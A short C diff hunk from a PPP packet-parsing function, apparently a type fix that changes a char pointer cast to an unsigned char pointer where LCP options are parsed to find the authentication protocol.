@@ -123,7 +123,7 @@ static void parse_ppp(struct packet_object *po)
    if ( lcp->code != PPP_CONFIGURE_REQUEST && lcp->code != PPP_CONFIGURE_NAK && lcp->code != PPP_CONFIGURE_REJ) 
       return;
 
-   if ( (option=(u_int16 *)parse_option( (char *)(lcp + 1), PPP_AUTH_REQUEST, ntohs(lcp->length) - sizeof(*lcp))) ==NULL) 
+   if ( (option=(u_int16 *)parse_option( (u_char *)(lcp + 1), PPP_AUTH_REQUEST, ntohs(lcp->length) - sizeof(*lcp))) ==NULL) 
       return;
       
    if ( option[1] != htons(PPP_REQUEST_CHAP) ) 
